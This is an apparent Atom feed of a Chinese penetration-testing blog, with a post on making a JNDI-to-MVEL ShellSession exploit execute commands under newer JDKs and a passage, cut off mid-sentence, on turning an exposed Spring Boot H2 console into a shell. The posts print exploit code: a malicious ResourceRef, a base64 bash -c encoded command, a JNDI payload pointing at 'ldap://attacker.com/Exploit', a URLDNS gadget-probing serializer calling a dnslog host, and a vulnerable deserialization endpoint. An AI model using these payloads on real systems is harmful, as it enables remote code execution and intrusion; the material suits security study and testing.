<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>😊#</title>
  
  
  <link href="https://jkme.github.io/atom.xml" rel="self"/>
  
  <link href="https://jkme.github.io/"/>
  <updated>2022-03-21T06:53:39.719Z</updated>
  <id>https://jkme.github.io/</id>
  
  <author>
    <name>JKme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JNDI Bypass - MVEL</title>
    <link href="https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html"/>
    <id>https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T06:53:39.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p>JDNI利用mvel绕过高版本java限制的时候，使用<a href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>编码变形之后执行命令失败。只能弹个计算器。<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>浅蓝师傅在<a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI 漏洞的利用方法</a>中给出的执行方式:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先说结论：把执行命令的时候<code>push</code>指令去掉，可以成功执行命令。</p><h2 id="原因探索"><a href="#原因探索" class="headerlink" title="原因探索"></a>原因探索</h2><p>先把测试的命令做一次编码:<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>经过编码之后： <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><h3 id="存在push的时候"><a href="#存在push的时候" class="headerlink" title="存在push的时候"></a>存在push的时候</h3><p>经过一路的跳转，进入到<code>_exec()</code>函数，调用堆栈如下:</p><pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数在108行对传入的字符串进行分割: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>， <code>\s</code>表示空格、tab、换行: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>等<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>分割之后，得到<code>inTokens</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span>  <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后获取<code>inTokens[1:]</code>赋值给<code>passParamters</code>。继续跟进到119行代码: <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>，进入调用push指令的函数，此时的参数如下：<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>在<code>pushContext.java</code>里面调用<code>MVEL.eval</code>解析MVEL表达式，这个时候可以看出来执行<code>MVEL.eval</code>的时候，第一个参数是args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>，所以会导致命令执行失败:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p><h3 id="去掉push的时候"><a href="#去掉push的时候" class="headerlink" title="去掉push的时候"></a>去掉push的时候</h3><p>当没有push的时候，执行到<code>SHellSession.java</code>会跳转到123行代码分支，然后实例化<code>MVELInterpretedRuntime</code>之后调用<code>parse()</code>函数:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>经过一系列解析判断之后最终进入到<code>propertyAccessor.class</code>的896行，获取到<code>Runtime</code>上下文之后调用传入的参数:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>函数调用堆栈:</p><pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)getNormal:181, PropertyAccessor (org.mvel2)get:145, PropertyAccessor (org.mvel2)get:125, PropertyAccessor (org.mvel2)getReducedValue:187, ASTNode (org.mvel2.ast)parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)parse:58, MVELInterpretedRuntime (org.mvel2)_exec:171, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a></li><li><a href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li><li><a href="https://github.com/JKme/EvilRMI">EvilRMI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;测试背景&quot;&gt;&lt;a href=&quot;#测试背景&quot; class=&quot;headerlink&quot; title=&quot;测试背景&quot;&gt;&lt;/a&gt;测试背景&lt;/h2&gt;&lt;p&gt;JDNI利用mvel绕过高版本java限制的时候，使用&lt;a href=&quot;https://ares-x.com/tools/runtime-exec/&quot;&gt;runtime exec&lt;/a&gt;编码变形之后执行命令失败。只能弹个计算器。&lt;br&gt;&lt;img src=&quot;/2022/03/21/jndi-exec-by-mvel/1.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;测试结果&quot;&gt;&lt;a href=&quot;#测试结果&quot; class=&quot;headerlink&quot; title=&quot;测试结果&quot;&gt;&lt;/a&gt;测试结果&lt;/h2&gt;&lt;p&gt;浅蓝师傅在&lt;a href=&quot;https://tttang.com/archive/1405/&quot;&gt;探索高版本JDK下JNDI 漏洞的利用方法&lt;/a&gt;中给出的执行方式:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tomcat_MVEL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; ref &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.mvel2.sh.ShellSession&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.naming.factory.BeanFactory&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;forceString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a=exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ref&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先说结论：把执行命令的时候&lt;code&gt;push&lt;/code&gt;指令去掉，可以成功执行命令。&lt;/p&gt;
&lt;h2 id=&quot;原因探索&quot;&gt;&lt;a href=&quot;#原因探索&quot; class=&quot;headerlink&quot; title=&quot;原因探索&quot;&gt;&lt;/a&gt;原因探索&lt;/h2&gt;&lt;p&gt;先把测试的命令做一次编码:&lt;code&gt;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt;&lt;br&gt;经过编码之后： &lt;code&gt;bash -c &amp;#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;存在push的时候&quot;&gt;&lt;a href=&quot;#存在push的时候&quot; class=&quot;headerlink&quot; title=&quot;存在push的时候&quot;&gt;&lt;/a&gt;存在push的时候&lt;/h3&gt;&lt;p&gt;经过一路的跳转，进入到&lt;code&gt;_exec()&lt;/code&gt;函数，调用堆栈如下:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>从Spring Boot H2 Database到GetShell</title>
    <link href="https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html"/>
    <id>https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html</id>
    <published>2022-03-17T16:00:00.000Z</published>
    <updated>2022-03-21T08:20:00.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-切入点"><a href="#0x1-切入点" class="headerlink" title="0x1. 切入点"></a>0x1. 切入点</h2><p>在日常测试的时候，使用ffuf发现一个<code>/console</code>的接口，打开之后发现是H2 Database页面：<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在<a href="https://anquan.baidu.com/article/1078">JNDI注入漏洞</a>.</p><p>设置<code>Driver Class</code>为<code>javax.naming.InitialContext</code>，<code>JDBC URL</code>为<code>ldap://attacker.com/Exploit</code>：<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>根据<code>/env</code>泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。</p><blockquote><p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true<br>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p></blockquote><h2 id="0x2-绕过和利用"><a href="#0x2-绕过和利用" class="headerlink" title="0x2. 绕过和利用"></a>0x2. 绕过和利用</h2><h3 id="利用本地Class作为Reference-Factory绕过"><a href="#利用本地Class作为Reference-Factory绕过" class="headerlink" title="利用本地Class作为Reference Factory绕过"></a>利用本地Class作为Reference Factory绕过</h3><p>利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：</p><ul><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li></ul><p>URLDNS的测试代码，生成一个序列化的数据包<code>1.ser</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>        <span class="token comment">//ois.readObject();</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为动态生成的类也可以被反序列化，因此上面代码生成的序列化数据，最好在另外一个环境里面反序列化测试。<br>post请求提交上面生成的<code>1.ser</code>到<code>/yso</code>接口，如果生成<code>1.ser</code>里面的类在反序列化的时候存在，则会收到dnslog请求：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>珂字辈师傅已经写好了<a href="https://github.com/kezibei/Urldns">URLDNS</a>，可以生成探测需要的序列化数据包。当存在JNDI注入的时候，启动LDAP服务:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>，然后使用PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>。</p><h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>借用Ceye.io探测H2 Database的页面，发现可以利用的链很多，比如<code>cc1, 